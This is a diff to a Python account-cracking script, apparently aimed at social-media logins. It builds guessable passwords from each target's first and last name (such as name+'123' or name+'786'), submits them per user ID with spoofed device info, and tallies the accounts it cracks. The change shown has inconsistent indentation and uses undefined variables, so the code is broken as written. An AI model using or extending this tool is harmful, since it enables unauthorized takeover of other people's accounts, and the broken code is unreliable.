@@ -456,10 +456,13 @@ class crack_main():
                         global ok,loop,android_models
                         sys.stdout.write('\r[ZEE-F] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                         fn = name.split(' ')[0]
-                        try:
-                                ln = name.split(' ')[1]
-                        except:
-                                ln = fn
+                try:
+                        ln = name.split(' ')[1]
+                except:
+                        ln = fn
+                fs = first_name.lower()
+                ls = last_name.lower()
+                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
                         for pw in passlist:
                                 pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
                                 infos = open('device_info.txt','r').read()
@@ -509,7 +512,7 @@ class crack_main():
                         linex()
                         for user in self.id:
                                 iid,zee = user.split('|')
-                                formSubmit.submit(self.rndm,iid,zee,passlist)
+                                formSubmit.submit(self.m1,iid,zee,passlist)
                 print(50*'=')
                 print(' SucessFully Process Is Completed ')
                 print(' Total Ok Ids : '+str(len(ok)))
